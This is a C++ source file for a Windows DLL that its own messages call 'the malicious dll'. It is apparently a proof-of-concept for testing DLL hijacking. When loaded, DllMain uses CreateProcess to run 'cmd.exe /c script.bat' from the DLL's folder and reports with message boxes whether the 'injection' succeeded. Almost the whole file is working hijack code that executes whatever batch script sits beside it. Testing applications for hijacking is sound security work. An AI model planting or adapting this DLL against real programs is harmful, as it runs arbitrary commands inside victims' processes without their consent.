// dllmain.cpp
#include <Windows.h>

void messageSuccess(void) {
	MessageBox(0,
		TEXT("Injection succeed"),
		TEXT("DLL Injection succeed"),
		MB_ICONINFORMATION);
}

void messageFailed(LPCTSTR error, LPCTSTR ErroTtitle) {
	MessageBox(0,
		error,
		ErroTtitle,
		MB_ICONINFORMATION);
}

int fileExist(LPCTSTR file) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		TCHAR ErroMsg[200] = TEXT("This program is vulnerable to DLL injection. \n\n "
			"Put a script file named script.bat in the same folder as the malicious dll and launch the vulnerable program.");
		TCHAR ErroTtitle[20] = TEXT("DLL Hijacking");
		messageFailed(ErroMsg, ErroTtitle);
		return 0;
	}
	else
	{
		FindClose(hFind);
	}
	return 1;
}

void scriptExec(void) {

	TCHAR File1[50] = TEXT("script.bat");
	if (!fileExist(File1)) {
	return;
	}

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	TCHAR lpszClientPath[50] = TEXT("cmd.exe /c script.bat");
	if (CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
		messageSuccess();
	}
	else {
		TCHAR ErroMsg[20] = TEXT("Execution failed");
		TCHAR ErroTtitle[30] = TEXT("Script execution failed");
		messageFailed(ErroMsg, ErroTtitle);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		scriptExec();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}